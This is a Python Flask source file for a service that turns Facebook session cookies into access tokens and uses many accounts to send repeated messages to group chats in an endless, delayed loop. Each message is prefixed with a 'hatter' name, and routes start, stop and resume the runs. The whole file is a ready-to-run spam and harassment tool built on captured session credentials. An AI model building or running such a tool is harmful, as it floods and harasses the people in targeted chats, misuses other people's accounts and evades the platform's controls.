from flask import Flask, request, jsonify, Response
import requests
import threading
import time
import uuid

app = Flask(__name__)

active_convos = {}
resume_data = {}

def extract_access_token_from_cookie(cookie):
    try:
        res = requests.get("https://business.facebook.com/business_locations",
                           headers={"User-Agent": "Mozilla/5.0"},
                           cookies={"cookie": cookie})
        token = res.text.split('accessToken":"')[1].split('"')[0]
        return token
    except:
        return None

def validate_token_or_cookie(acc_type, value):
    if acc_type == "cookie":
        access_token = extract_access_token_from_cookie(value)
    else:
        access_token = value

    try:
        res = requests.get(f"https://graph.facebook.com/me?fields=id,name,email&access_token={access_token}")
        if res.status_code == 200:
            data = res.json()
            return True, {
                "name": data.get("name"),
                "uid": data.get("id"),
                "email": data.get("email", "N/A"),
                "access_token": access_token
            }
    except:
        pass
    return False, {}

@app.route("/validate_id", methods=["POST"])
def validate_id():
    data = request.json
    acc_type = data.get("type")
    value = data.get("value")

    valid, details = validate_token_or_cookie(acc_type, value)
    if valid:
        return jsonify({"valid": True, "name": details["name"]})
    return jsonify({"valid": False})

def send_messages(convo_name, accounts, group_ids, hatter_name, messages, delay):
    logs = []
    active_convos[convo_name] = True
    i = 0
    while active_convos.get(convo_name):
        for acc in accounts:
            valid, info = validate_token_or_cookie(acc["type"], acc["value"])
            if not valid:
                logs.append(f"❌ Invalid Account Skipped")
                continue

            access_token = info["access_token"]
            for gid in group_ids:
                msg = f"{hatter_name}: {messages[i % len(messages)]}"
                url = f"https://graph.facebook.com/v15.0/t_{gid}/messages"
                payload = {
                    "messaging_type": "MESSAGE_TAG",
                    "tag": "CONFIRMED_EVENT_UPDATE",
                    "recipient": f"{gid}",
                    "message": {"text": msg},
                    "access_token": access_token
                }
                try:
                    r = requests.post(url, data={"message": msg, "access_token": access_token})
                    if r.status_code == 200:
                        logs.append(f"✅ Sent to {gid}")
                    else:
                        logs.append(f"❌ Failed on {gid}")
                except Exception as e:
                    logs.append(f"⚠ Error sending to {gid}: {str(e)}")
        i += 1
        time.sleep(delay)
    logs.append("⛔ Convo Stopped.")
    resume_data[convo_name] = {
        "accounts": accounts,
        "group_ids": group_ids,
        "hatter_name": hatter_name,
        "messages": messages,
        "delay": delay
    }

@app.route("/start_convo", methods=["POST"])
def start_convo():
    data = request.json
    convo_name = data.get("convo_name")
    accounts = data.get("accounts")
    group_ids = data.get("group_ids")
    hatter_name = data.get("hatter_name")
    messages = data.get("messages")
    delay = int(data.get("delay"))

    if convo_name in active_convos:
        return "❗ Conversation already running."

    t = threading.Thread(target=send_messages, args=(convo_name, accounts, group_ids, hatter_name, messages, delay))
    t.start()
    return "🚀 Conversation Started"

@app.route("/view_convos")
def view_convos():
    return jsonify({"conversations": list(active_convos.keys())})

@app.route("/resume_convos")
def resume_convos():
    return jsonify({"resumable": list(resume_data.keys())})

@app.route("/stream_convo/<convo>")
def stream_convo(convo):
    def stream():
        count = 1
        while convo in active_convos:
            yield f"Message {count}\n"
            count += 1
            time.sleep(2)
    return Response(stream(), mimetype="text/plain")

@app.route("/stream_resume/<convo>")
def stream_resume(convo):
    if convo not in resume_data:
        return "❌ No resume data."

    d = resume_data.pop(convo)
    t = threading.Thread(target=send_messages, args=(convo, d["accounts"], d["group_ids"], d["hatter_name"], d["messages"], d["delay"]))
    t.start()
    return Response(f"✅ Resuming {convo}...\n", mimetype="text/plain")

@app.route("/stop_convo", methods=["POST"])
def stop_convo():
    data = request.json
    convo_name = data.get("convo_name")
    if convo_name in active_convos:
        active_convos[convo_name] = False
        return "🛑 Conversation Stopping..."
    return "❌ Convo not running."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
